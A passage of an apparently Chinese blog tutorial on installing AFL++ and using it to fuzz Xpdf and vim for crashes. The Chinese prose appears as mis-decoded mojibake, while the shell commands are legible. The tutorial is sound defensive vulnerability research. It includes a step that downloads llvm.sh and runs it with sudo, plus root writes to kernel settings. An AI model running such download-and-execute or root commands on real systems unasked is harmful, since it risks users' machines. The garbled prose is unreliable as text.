å’Œå…¶ä»–å¼€å‘è€…å¼€å‘ã€‚AFLplusplus åœ¨ AFL çš„åŸºç¡€ä¸Šè¿›è¡Œäº†è®¸å¤šæ”¹è¿›ï¼ŒåŒ…æ‹¬ï¼š</p><ul><li>æ›´å¿«çš„æ‰§è¡Œé€Ÿåº¦ï¼šAFLplusplus ä½¿ç”¨äº†æ–°çš„ç¼–è¯‘å™¨æ’ä»¶å’Œå…¶ä»–æŠ€æœ¯æ¥æé«˜ fuzz çš„é€Ÿåº¦ã€‚</li><li>æ›´å¼ºå¤§çš„å˜å¼‚ç®—æ³•ï¼šAFLplusplus æä¾›äº†æ›´å¼ºå¤§çš„å˜å¼‚ç®—æ³•ï¼Œå¯ä»¥ç”Ÿæˆæ›´å¤æ‚çš„è¾“å…¥æ•°æ®ã€‚</li><li>æ›´å…¨é¢çš„è¦†ç›–ç‡ï¼šAFLplusplus æä¾›äº†æ›´å…¨é¢çš„è¦†ç›–ç‡åˆ†æï¼Œå¯ä»¥å¸®åŠ©å¼€å‘äººå‘˜å‘ç°è½¯ä»¶ä¸­çš„éšè—è·¯å¾„ã€‚</li></ul><p>ç›®å‰ Google çš„ oss-fuzz é¡¹ç›®å·²ç»ä½¿ç”¨ AFL++ æ›¿æ¢ AFL ä½œä¸ºå…¶ä¸»è¦ fuzz å·¥å…·ï¼ŒAFL++ åœ¨é€Ÿåº¦ã€å˜å¼‚ç®—æ³•å’Œè¦†ç›–ç‡åˆ†ææ–¹é¢éƒ½æ¯” AFL æ›´ä¼˜ç§€ã€‚</p><h2 id="â˜†-2-AFL-çš„å®‰è£…"><a href="#â˜†-2-AFL-çš„å®‰è£…" class="headerlink" title="â˜† 2. AFL++ çš„å®‰è£…"></a>â˜† 2. AFL++ çš„å®‰è£…</h2><p>AFL++ çš„æºç æœ‰ä¸¤ä¸ªåˆ†æ”¯ï¼Œstable åˆ†æ”¯ [2] ä¸ºå‘å¸ƒåˆ†æ”¯ï¼Œdev åˆ†æ”¯ [3] ä¸ºå¼€å‘åˆ†æ”¯ã€‚dev åˆ†æ”¯ä»£ç çš„æ›´æ–°é¢‘ç‡å¾ˆé«˜ï¼Œä¹Ÿä¸æ˜¯å¾ˆç¨³å®šå¯èƒ½å‡ºç° bugï¼Œæ¨èä½¿ç”¨ stable åˆ†æ”¯çš„æºç ã€‚ä»¥ ubuntu 18.04 ä¸ºä¾‹ä»‹ç»å¦‚ä½•å®‰è£… AFLplusplus</p><p>ä¸‹è½½æºç ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/AFLplusplus/AFLplusplus<br>git submodule update --init --recursive<br></code></pre></td></tr></table></figure><p><strong>git submodule</strong> è¿™æ¡å‘½ä»¤å¾ˆé‡è¦ï¼Œè¦ä¸ç¼–è¯‘ä¸€äº› AFL++ mode çš„æ—¶å€™ä¼šå› ä¸ºç¼ºå°‘æºç è€ŒæŠ¥é”™ã€‚</p><p>è¦ä»æºç ç¼–è¯‘ AFL++ éœ€è¦å…ˆå®‰è£…ç³»ç»Ÿçš„ä¾èµ–åº“ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo apt-get update<br>sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools curl ninja-build<br></code></pre></td></tr></table></figure><p>AFL++ åœ¨æ–‡æ¡£ä¸­æ¨èä½¿ç”¨ llvm 13+ ,  æ‰€ä»¥å…ˆè¦å‡çº§ Ubuntu ç³»ç»Ÿçš„ llvm ï¼Œ<a href="https://apt.llvm.org/">https://apt.llvm.org/</a> æä¾›äº†ç¼–è¯‘å¥½çš„ llvm binary å¯ä»¥ä¸‹è½½ï¼Œä¹Ÿæä¾›äº† llvm.sh å¯ä»¥éå¸¸æ–¹é¢çš„å®‰è£…æ–°ç‰ˆæœ¬çš„ llvmï¼Œä¸‹é¢çš„ä¾‹å­æ¼”ç¤ºå®‰è£… llvm 15</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget https://apt.llvm.org/llvm.sh<br><span class="hljs-built_in">chmod</span> +x llvm.sh<br>sudo ./llvm.sh 15 all<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ AFL++</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-15&quot;</span><br>make distrib<br></code></pre></td></tr></table></figure><h2 id="â˜†-3-AFL-Linux-ç³»ç»Ÿç¯å¢ƒé…ç½®"><a href="#â˜†-3-AFL-Linux-ç³»ç»Ÿç¯å¢ƒé…ç½®" class="headerlink" title="â˜† 3. AFL++ Linux ç³»ç»Ÿç¯å¢ƒé…ç½®"></a>â˜† 3. AFL++ Linux ç³»ç»Ÿç¯å¢ƒé…ç½®</h2><p>ä¸ºäº†ä½¿ AFL++ åœ¨ fuzz æ—¶è·å¾—æ›´å¥½çš„æ€§èƒ½ï¼Œå¯ä»¥ä½¿ç”¨ root ç”¨æˆ·æ‰§è¡Œä¸‹é¢çš„è„šæœ¬ï¼Œ è°ƒæ•´ linux å†…æ ¸çš„å‚æ•°ã€‚</p><p><code>sudo bash afl-init.sh</code> </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">echo</span> 1 &gt;/proc/sys/kernel/sched_child_runs_first<br><span class="hljs-built_in">echo</span> 1 &gt;/proc/sys/kernel/sched_autogroup_enabled<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/vm/overcommit_memory<br><span class="hljs-built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern<br><span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/enabled<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpufreq/scaling_governor &amp;&amp; <span class="hljs-built_in">echo</span> performance | <span class="hljs-built_in">tee</span> /sys/devices/system/cpu/cpufreq/scaling_governor<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpufreq/policy0/scaling_governor &amp;&amp; <span class="hljs-built_in">echo</span> performance | <span class="hljs-built_in">tee</span> /sys/devices/system/cpu/cpufreq/policy*/scaling_governor<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor &amp;&amp; <span class="hljs-built_in">echo</span> performance | <span class="hljs-built_in">tee</span> /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor<br><span class="hljs-built_in">test</span> -e /sys/devices/system/cpu/cpufreq/boost &amp;&amp; <span class="hljs-built_in">echo</span> 1 &gt; /sys/devices/system/cpu/cpufreq/boost<br></code></pre></td></tr></table></figure><h2 id="â˜†-4-AFL-çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•"><a href="#â˜†-4-AFL-çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•" class="headerlink" title="â˜† 4. AFL++ çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•"></a>â˜† 4. AFL++ çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•</h2><h3 id="4-1-ç¼–è¯‘æ’æ¡©æ¨¡ç³Šæµ‹è¯•ç›®æ ‡è½¯ä»¶"><a href="#4-1-ç¼–è¯‘æ’æ¡©æ¨¡ç³Šæµ‹è¯•ç›®æ ‡è½¯ä»¶" class="headerlink" title="4.1 ç¼–è¯‘æ’æ¡©æ¨¡ç³Šæµ‹è¯•ç›®æ ‡è½¯ä»¶"></a>4.1 ç¼–è¯‘æ’æ¡©æ¨¡ç³Šæµ‹è¯•ç›®æ ‡è½¯ä»¶</h3><p>ä¼˜å…ˆä½¿ç”¨ llvm clang å¯¹ç›®æ ‡è½¯ä»¶è¿›è¡Œæ’æ¡©ï¼Œåœ¨æœ€è¿‘å‡ å¹´çš„å®æˆ˜æ–‡ç« ä¸­å·²ç»å¾ˆå°‘çœ‹åˆ°ä½¿ç”¨ gcc æ’æ¡©ç›®æ ‡è½¯ä»¶çš„ä¾‹å­ã€‚AFL++ æä¾›äº†å¤šç§æ’æ¡©æ–¹å¼ï¼Œå¯ä»¥å‚è€ƒ:<br><a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable/instrumentation">https://github.com/AFLplusplus/AFLplusplus/tree/stable/instrumentation</a></p><p>ä½¿ç”¨ Â afl-clang-fast&#x2F;afl-clang-fast++ æˆ–è€… afl-clang-lto&#x2F;afl-clang-lto++ å¯ä»¥åº”å¯¹å¤§å¤šæ•°æƒ…å†µï¼Œafl-clang-lto&#x2F;afl-clang-lto++ åœ¨ç¼–è¯‘å¤§å‹ç¨‹åºçš„æ—¶å€™å¯èƒ½ä¼šå¤±è´¥ï¼Œå¦‚æœå‡ºç°å¤±è´¥çš„æƒ…å†µï¼Œå¯ä»¥æ¢ç”¨ afl-clang-fast&#x2F;afl-clang-fast++ ã€‚ ä¸‹é¢çš„ç¤ºä¾‹åˆ†åˆ«é’ˆå¯¹ä¸‰ç§ä¸åŒç¼–è¯‘ç³»ç»Ÿæƒ…å†µï¼Œ[a] ä½¿ç”¨ Makefile , [b] ä½¿ç”¨ cmakeï¼Œ[c] ä½¿ç”¨ meson , éœ€è¦æ ¹æ®å…·ä½“æƒ…å†µé€‰æ‹©ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">CC=afl-cc CXX=afl-c++ ./configure --disable-shared <span class="hljs-comment"># [a]</span><br>cmake -DCMAKE_C_COMPILERC=afl-cc -DCMAKE_CXX_COMPILER=afl-c++ . <span class="hljs-comment"># [b]</span><br>CC=afl-cc CXX=afl-c++ meson <span class="hljs-comment"># [c]</span><br></code></pre></td></tr></table></figure><p>ä¸‹è½½ Xpdf 3.02 ä½œä¸º fuzz ç›®æ ‡ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz<br>tar -xvzf xpdf-3.02.tar.gz<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ Xpdf</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> xpdf<br>CC=afl-cc CXX=afl-c++ ./configure --disable-shared --prefix=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzz_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></td></tr></table></figure><p>å°†å¾—åˆ°æˆ‘ä»¬çš„ fuzz ç›®æ ‡  <code>$HOME/fuzz_xpdf/install/bin/pdftotext</code></p><h3 id="4-2-AFL-çš„å‘½ä»¤è¡Œå‚æ•°"><a href="#4-2-AFL-çš„å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="4.2 AFL++ çš„å‘½ä»¤è¡Œå‚æ•°"></a>4.2 AFL++ çš„å‘½ä»¤è¡Œå‚æ•°</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">afl-fuzz -i <span class="hljs-variable">$HOME</span>/AFLplusplus/testcases/others/pdf -o <span class="hljs-variable">$HOME</span>/fuzz_xpdf/out/ -s 123 -- <span class="hljs-variable">$HOME</span>/fuzz_xpdf/install/bin/pdftotext @@ <span class="hljs-variable">$HOME</span>/fuzz_xpdf/output<br></code></pre></td></tr></table></figure><ul><li>-i  è¾“å…¥ç›®å½•ï¼Œç”¨äºå­˜æ”¾åˆå§‹ testcase</li><li>-o è¾“å‡ºç›®å½•ï¼Œç”¨äºå­˜æ”¾ afl-fuzz ç”Ÿæˆçš„ testcase</li><li>â€“ åé¢æ¥ fuzz ç›®æ ‡çš„å‘½ä»¤è¡Œ   @@ ä»£è¡¨æ–‡ä»¶ï¼Œä¸å†™ @@ ä»£è¡¨æ˜¯ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®</li><li>-s  RNG çš„ seed</li></ul><h2 id="â˜†-5-å®æˆ˜-vim-æ¼æ´æŒ–æ˜"><a href="#â˜†-5-å®æˆ˜-vim-æ¼æ´æŒ–æ˜" class="headerlink" title="â˜† 5. å®æˆ˜ vim æ¼æ´æŒ–æ˜"></a>â˜† 5. å®æˆ˜ vim æ¼æ´æŒ–æ˜</h2><p>é¦–å…ˆéœ€è¦ç ”ç©¶ vim çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œé»˜è®¤çš„é…ç½®ä¸‹ vim å¯åŠ¨é€Ÿåº¦æ…¢ï¼Œå¹¶ä¸”æœ‰å¯èƒ½æ‰§è¡Œå¤–éƒ¨shell å‘½ä»¤ ï¼ˆä¸å®‰å…¨ï¼‰ï¼Œæœ€ç»ˆéœ€è¦ä½¿ç”¨çš„å‘½ä»¤è¡Œå‚æ•°å¦‚ä¸‹ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>-u NONE è·³è¿‡åˆå§‹åŒ–<br><span class="hljs-bullet">- </span>-X åŠ å¿«å¯åŠ¨é€Ÿåº¦<br><span class="hljs-bullet">- </span>-s å®‰é™æ¨¡å¼<br><span class="hljs-bullet">- </span>-Z å—é™æ¨¡å¼ (All commands that make use of an external shell are disabled.)<br><span class="hljs-bullet">- </span>-e ä»¥ Ex æ¨¡å¼è¿è¡Œ vim<br><span class="hljs-bullet">- </span>-S åŠ è½½ç¬¬ä¸€ä¸ªæ–‡ä»¶åæ‰§è¡Œæ–‡ä»¶ &lt;session&gt;<br><span class="hljs-bullet">- </span>-c &lt;command&gt; åŠ è½½ç¬¬ä¸€ä¸ªæ–‡ä»¶åæ‰§è¡Œ &lt;command&gt;<br><span class="hljs-bullet">- </span>-n ä¸ä½¿ç”¨äº¤æ¢æ–‡ä»¶ï¼Œåªä½¿ç”¨å†…å­˜<br><span class="hljs-bullet">- </span>-m Modifications not allowed to be written<br></code></pre></td></tr></table></figure><h3 id="5-0-vim-çš„-Ex-æ¨¡å¼ä»‹ç»"><a href="#5-0-vim-çš„-Ex-æ¨¡å¼ä»‹ç»" class="headerlink" title="5.0 vim çš„ Ex æ¨¡å¼ä»‹ç»"></a>5.0 vim çš„ Ex æ¨¡å¼ä»‹ç»</h3><p>Vim ç¼–è¯‘å™¨æœ‰ä¸‰ç§æ¨¡å¼ï¼šæ™®é€šæ¨¡å¼ã€æ’å…¥æ¨¡å¼å’Œ ex æ¨¡å¼ã€‚ex æ¨¡å¼æ˜¯ Vim çš„åº•å±‚å‘½ä»¤æ¨¡å¼ï¼Œç”¨äºæ‰§è¡Œå„ç§æ–‡ä»¶æ“ä½œï¼Œå¦‚æ‰“å¼€ã€ç¼–è¾‘ã€ä¿å­˜ã€æœç´¢ã€æ›¿æ¢ã€æ’åºç­‰ã€‚è¦è¿›å…¥ ex æ¨¡å¼ï¼Œå¯ä»¥æŒ‰ä¸‹ : é”®ã€‚åœ¨ ex æ¨¡å¼ä¸‹ï¼Œå¯ä»¥è¾“å…¥å„ç§å‘½ä»¤æ¥æ‰§è¡Œæ“ä½œã€‚å‘½ä»¤ç”±è¡Œå·å’Œå‘½ä»¤ç»„æˆï¼Œä»¥å›è½¦é”®ç»“æŸã€‚</p><p>æœ€åŸºæœ¬çš„ ex å‘½ä»¤æ˜¯ p å‘½ä»¤ï¼Œç”¨äºæ‰“å°æŒ‡å®šè¡Œå·çš„è¡Œã€‚ä¾‹å¦‚ï¼Œè¦æ‰“å°ç¬¬ 10 è¡Œï¼Œå¯ä»¥è¾“å…¥ 10pã€‚</p><p>å…¶ä»–å¸¸ç”¨çš„ ex å‘½ä»¤åŒ…æ‹¬ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">e å‘½ä»¤ï¼šæ‰“å¼€å¦ä¸€ä¸ªæ–‡ä»¶<br>w å‘½ä»¤ï¼šä¿å­˜å½“å‰æ–‡ä»¶<br>q å‘½ä»¤ï¼šé€€å‡º Vim<br>s å‘½ä»¤ï¼šå°†å½“å‰è¡Œæ›¿æ¢ä¸ºæŒ‡å®šæ–‡æœ¬<br>g<span class="hljs-operator">/</span><span class="hljs-keyword">pattern</span><span class="hljs-operator">/</span>s<span class="hljs-operator">/</span><span class="hljs-keyword">old</span><span class="hljs-operator">/</span><span class="hljs-keyword">new</span><span class="hljs-operator">/</span> å‘½ä»¤ï¼šå°†æ‰€æœ‰åŒ¹é…æ¨¡å¼ <span class="hljs-keyword">pattern</span> çš„è¡Œæ›¿æ¢ä¸º <span class="hljs-keyword">old</span> æ›¿æ¢ä¸º <span class="hljs-keyword">new</span>ã€‚<br>:sort å‘½ä»¤ï¼šå¯¹å½“å‰æ–‡ä»¶è¿›è¡Œæ’åºã€‚<br></code></pre></td></tr></table></figure><p>ex æ¨¡å¼çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼šåœ¨æ™®é€šæ¨¡å¼ä¸‹ï¼ŒæŒ‰ä¸‹ : é”®è¿›å…¥ ex æ¨¡å¼ï¼Œè¾“å…¥å‘½ä»¤ï¼ŒæŒ‰ä¸‹å›è½¦é”®æ‰§è¡Œå‘½ä»¤ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€äº› ex æ¨¡å¼çš„ä½¿ç”¨ç¤ºä¾‹ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># æ‰“å¼€æ–‡ä»¶</span><br><span class="hljs-symbol">:e</span> test.txt<br><br><span class="hljs-comment"># ç¼–è¾‘æ–‡ä»¶</span><br><span class="hljs-number">10</span>iHello, world!<br><br><span class="hljs-comment"># ä¿å­˜æ–‡ä»¶</span><br><span class="hljs-symbol">:w</span><br><br><span class="hljs-comment"># é€€å‡º Vim</span><br><span class="hljs-symbol">:q</span><br></code></pre></td></tr></table></figure><p>ex æ¨¡å¼æä¾›äº†ä¸°å¯Œçš„å‘½ä»¤ï¼Œå¯ä»¥ç”¨äºæ‰§è¡Œå„ç§æ–‡ä»¶æ“ä½œã€‚ç†Ÿç»ƒæŒæ¡ ex æ¨¡å¼å¯ä»¥æé«˜ Vim çš„ä½¿ç”¨æ•ˆç‡ã€‚</p><h3 id="5-1-æ”»å‡»é¢åˆ†æ"><a href="#5-1-æ”»å‡»é¢åˆ†æ" class="headerlink" title="5.1 æ”»å‡»é¢åˆ†æ"></a>5.1 æ”»å‡»é¢åˆ†æ</h3><p>ç ”ç©¶å†å²æ¼æ´å‘ç°ï¼Œvim ä¸»è¦æœ‰ä¸¤ä¸ªæ”»å‡»é¢ï¼Œ vim æ­£åˆ™è¡¨è¾¾å¼å¼•æ“å’Œvim è„šæœ¬æ‰§è¡Œå¼•æ“ã€‚</p><h4 id="vim-çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“"><a href="#vim-çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“" class="headerlink" title="vim çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“"></a>vim çš„æ­£åˆ™è¡¨è¾¾å¼å¼•æ“</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">./vim -u <span class="hljs-built_in">NONE</span> -i <span class="hljs-built_in">NONE</span> -X -Z -m -n -e -s -c <span class="hljs-string">&#x27;call search(getline(&quot;.&quot;))&#x27;</span> -c <span class="hljs-string">&#x27;:qa!&#x27;</span> ./poc<br></code></pre></td></tr></table></figure><h4 id="vim-çš„è„šæœ¬æ‰§è¡Œå¼•æ“"><a href="#vim-çš„è„šæœ¬æ‰§è¡Œå¼•æ“" class="headerlink" title="vim çš„è„šæœ¬æ‰§è¡Œå¼•æ“"></a>vim çš„è„šæœ¬æ‰§è¡Œå¼•æ“</h4><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">vim -u <span class="hljs-built_in">NONE</span> -i <span class="hljs-built_in">NONE</span> -X -Z -m -n -e -s -S ./poc -c <span class="hljs-string">&#x27;:qa!&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="5-2-ç¼–è¯‘-vim"><a href="#5-2-ç¼–è¯‘-vim" class="headerlink" title="5.2 ç¼–è¯‘ vim"></a>5.2 ç¼–è¯‘ vim</h3><p>é¦–å…ˆä¸‹è½½ vim çš„æºç </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/vim/vim.git<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘ vim ï¼Œä½¿ç”¨ afl-cc æ’æ¡©</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-15&quot;</span><br><span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">&quot;-O1 -g -fno-omit-frame-pointer&quot;</span><br><span class="hljs-built_in">cd</span> vim<br>CC=afl-cc CXX=afl-c++ ./configure --with-features=huge --enable-gui=none --disable-shared<br>make<br></code></pre></td></tr></table></figure><h3 id="5-3-å¯»æ‰¾-fuzz-vim-çš„-testcases-corpus"><a href="#5-3-å¯»æ‰¾-fuzz-vim-çš„-testcases-corpus" class="headerlink" title="5.3 å¯»æ‰¾ fuzz vim çš„ testcases ( corpus)"></a>5.3 å¯»æ‰¾ fuzz vim çš„ testcases ( corpus)</h3><p>vim å®˜æ–¹ä»“åº“é‡Œæœ‰å†å²ä¸Šé€ æˆ vim crash çš„ poc ï¼Œæ­£å¥½æ‹¿æ¥ç”¨ã€‚<br><a href="https://github.com/vim/vim/tree/master/src/testdir/crash">https://github.com/vim/vim/tree/master/src/testdir/crash</a></p><h3 id="5-4-fuzz-vim"><a href="#5-4-fuzz-vim" class="headerlink" title="5.4 fuzz vim"></a>5.4 fuzz vim</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p ~/fuzz/vim<br><span class="hljs-built_in">mkdir</span> -p /tmp/afl++<br>afl-fuzz -i testdir/crash/ -o ~/fuzz/vim -mnone -p fast -- ./vim -u NONE -i NONE -X -Z -m -n -e -s -S @@ -c <span class="hljs-string">&#x27;:qa!&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>-x æŒ‡å®šå­—å…¸æ–‡ä»¶</li><li>-mnone ä¸é™åˆ¶ä½¿ç”¨å†…å­˜</li></ul><h3 id="5-5-fuzz-ç»“æœ"><a href="#5-5-fuzz-ç»“æœ" class="headerlink" title="5.5  fuzz ç»“æœ"></a>5.5  fuzz ç»“æœ</h3><p>ç»è¿‡ 2å¤© 16 å°æ—¶çš„ fuzzï¼Œ AFL++ æŠ¥å‘Šæœ‰ 789 ä¸ª Crashes.</p><h3 id="5-6-è°ƒæ•´å’Œæ”¹è¿›"><a href="#5-6-è°ƒæ•´å’Œæ”¹è¿›" class="headerlink" title="5.6 è°ƒæ•´å’Œæ”¹è¿›"></a>5.6 è°ƒæ•´å’Œæ”¹è¿›</h3><p><code>~/fuzz/vim/default</code> ç›®å½•å‡ºç°äº†å¤§é‡çš„ <code> _cur_inp.*</code> æ–‡ä»¶ï¼Œè¿™æ˜¯ AFL++ ç”Ÿæˆçš„çš„ä¸´æ—¶æ–‡ä»¶ï¼Œä¸ºäº†å–å¾—æ›´å¥½çš„æ•ˆæœï¼Œéœ€è¦æŠŠè¿™äº›æ–‡ä»¶æ”¾åˆ° &#x2F;tmp ç›®å½•ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> AFL_TMPDIR=/tmp/afl++<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ AFL++ çš„ cmplog ç‰¹æ€§ï¼Œè§£å†³ä¸€äº›  fuzz ä¸Šçš„è·¯å¾„çº¦æŸ, ä¸»è¦æ€è·¯æ¥è‡ª <a href="https://github.com/RUB-SysSec/redqueen">https://github.com/RUB-SysSec/redqueen</a> ã€‚<br><a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md</a></p><p>è¦ä½¿ç”¨ cmplogï¼Œéœ€è¦é‡æ–°ç¼–è¯‘ vimï¼Œä½¿ç”¨ <code>AFL_LLVM_CMPLOG</code> ç¯å¢ƒå˜é‡ï¼ŒæŒ‡å®šä½¿ç”¨ cmplog çš„ç¼–è¯‘ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> src/vim src/vim-afl<br>make distclean<br><br><span class="hljs-built_in">export</span> LLVM_CONFIG=<span class="hljs-string">&quot;llvm-config-15&quot;</span><br><span class="hljs-built_in">export</span> CFLAGS=<span class="hljs-string">&quot;-O1 -g -fno-omit-frame-pointer&quot;</span><br><span class="hljs-built_in">cd</span> vim-cmplog<br><span class="hljs-built_in">export</span> AFL_LLVM_CMPLOG=1<br>CC=afl-cc CXX=afl-c++ ./configure --with-features=huge --enable-gui=none<br>make<br><span class="hljs-built_in">mv</span> src/vim src/vim-cmplog<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å®Œæˆåï¼Œå°†ç¼–è¯‘å¥½çš„ vim é‡å‘½åæˆ vim-cmplogï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ AFL++ å‘½ä»¤è¡Œï¼Œå¯ç”¨ cmplog</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> AFL_TMPDIR=/tmp/afl++-cmplog<br>afl-fuzz -i testdir/crash/ -o ~/fuzz/vim -mnone -p fast -S cmplog -c ./vim-cmplog -- ./vim-afl -u NONE -i NONE -X -Z -m -n -e -s -S @@ -c <span class="hljs-string">&#x27;:qa!&#x27;</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶è¿è¡Œä¸¤ä¸ª AFL++ å¯¹ vim è¿›è¡Œ fuzzã€‚</p><h2 id="Trophy"><a href="#Trophy" class="headerlink" title="Trophy"></a>Trophy</h2><p>å†å²ä¸Šä½¿ç”¨ä¸Šè¿°æ–¹æ³•å‘ç°äº†è®¸å¤š vim æ¼æ´ï¼Œéƒ¨åˆ†æ¼æ´ vim å®˜æ–¹å·²ç»ä¿®å¤ã€‚</p><p><a href="https://github.com/vim/vim/commit/0fb375aae608d7306b4baf9c1f906961f32e2abf">https://github.com/vim/vim/commit/0fb375aae608d7306b4baf9c1f906961f32e2abf</a><br><a href="https://github.com/vim/vim/commit/b39b240c386a5a29241415541f1c99e2e6b8ce47">https://github.com/vim/vim/commit/b39b240c386a5a29241415541f1c99e2e6b8ce47</a><br><a href="https://github.com/vim/vim/commit/eec0c2b3a4cfab93dd8d4adaa60638d47a2bbc8a">https://github.com/vim/vim/commit/eec0c2b3a4cfab93dd8d4adaa60638d47a2bbc8a</a><br><a href="https://github.com/vim/vim/commit/abfa13ebe92d81aaf66669c428d767847b577453">https://github.com/vim/vim/commit/abfa13ebe92d81aaf66669c428d767847b577453</a></p><h2 id="â˜†-å‚è€ƒèµ„æ–™"><a href="#â˜†-å‚è€ƒèµ„æ–™" class="headerlink" title="â˜†  å‚è€ƒèµ„æ–™"></a>â˜†  å‚è€ƒèµ„æ–™</h2><p>[1]  <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/INSTALL.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/docs/INSTALL.md</a><br>[2]  <a href="https://github.com/AFLplusplus/AFLplusplus/tree/stable">AFL ++ stable branch</a><br>[3]  <a 